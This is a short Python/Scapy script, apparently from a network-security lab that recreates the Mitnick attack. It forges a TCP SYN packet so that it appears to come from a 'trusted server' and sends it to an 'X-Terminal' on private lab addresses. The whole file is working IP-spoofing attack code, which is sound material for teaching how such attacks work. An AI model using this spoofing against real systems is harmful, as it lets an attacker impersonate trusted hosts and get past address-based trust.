#!/usr/bin/python3
from scapy.all import *

x_ip      = "10.0.2.68"  # X-Terminal
x_port    = 9090         # Port number used by X-Terminal

srv_ip    = "10.0.2.69"  # The trusted server
srv_port  = 8000         # Port number used by the trusted server

syn_seq   = 0x1000       # Initial sequence number 

# Spoof a SYN from Trusted Server to X-Terminal
ip  = IP(  src   = srv_ip, dst   = x_ip)
tcp = TCP( sport = srv_port, dport = x_port, 
           seq   = syn_seq, flags = 'S')
print('Sending SYN...')
send(ip/tcp, verbose=1)
